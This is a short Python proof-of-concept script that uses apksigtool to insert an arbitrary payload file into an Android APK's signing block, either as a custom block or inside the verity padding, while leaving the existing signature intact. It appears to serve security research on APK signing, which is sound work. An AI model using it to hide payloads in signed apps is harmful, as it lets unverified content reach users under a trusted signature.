#!/usr/bin/python3
# encoding: utf-8
# SPDX-FileCopyrightText: 2023 FC Stegerman <flx@obfusk.net>
# SPDX-License-Identifier: GPL-3.0-or-later

import apksigtool
import dataclasses

from dataclasses import dataclass
from typing import ClassVar, Tuple

POC_BLOCK_ID = 0x506f4342


@dataclass(frozen=True)
class PoCBlock(apksigtool.Block):
    payload: bytes

    PAIR_ID: ClassVar[int] = POC_BLOCK_ID

    def dump(self) -> bytes:
        return self.payload


@dataclass(frozen=True)
class VerityPaddingBlockWithPayload(apksigtool.VerityPaddingBlock):
    payload: bytes

    def dump(self) -> bytes:
        return self.payload + b"\x00" * (self.size - len(self.payload))


def add_poc(apkfile: str, payloadfile: str, verity: bool = False) -> None:
    with open(payloadfile, "rb") as fh:
        payload = fh.read()
    _, sig_block = old_v2_sig = apksigtool.extract_v2_sig(apkfile)
    blk = apksigtool.parse_apk_signing_block(sig_block)
    pairs_with_poc = add_poc_to_pairs(blk.pairs, payload, verity=verity)
    blk_poc = dataclasses.replace(blk, pairs=pairs_with_poc)
    apksigtool.replace_apk_signing_block(apkfile, blk_poc.dump(), old_v2_sig=old_v2_sig)


def add_poc_to_pairs(pairs: Tuple[apksigtool.Pair, ...], payload: bytes,
                     verity: bool) -> Tuple[apksigtool.Pair, ...]:
    if verity:
        found = False
        result = []
        for pair in pairs:
            if isinstance(pair.value, apksigtool.VerityPaddingBlock):
                found = True
                size = pair.value.size
                if len(payload) > size:
                    size += (len(payload) - size + 4096 - 1) // 4096 * 4096
                blk = VerityPaddingBlockWithPayload(size, payload)
                pair = apksigtool.Pair.from_block(blk)
            result.append(pair)
        if not found:
            raise ValueError("No verity padding block in pairs.")
        return tuple(result)
    else:
        poc_pair = apksigtool.Pair.from_block(PoCBlock(payload))
        return pairs + (poc_pair,)


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(prog="add_poc.py")
    parser.add_argument("--verity", action="store_true")
    parser.add_argument("apkfile", metavar="APKFILE")
    parser.add_argument("payloadfile", metavar="PAYLOADFILE")
    args = parser.parse_args()
    add_poc(args.apkfile, args.payloadfile, verity=args.verity)

# vim: set tw=80 sw=4 sts=4 et fdm=marker :
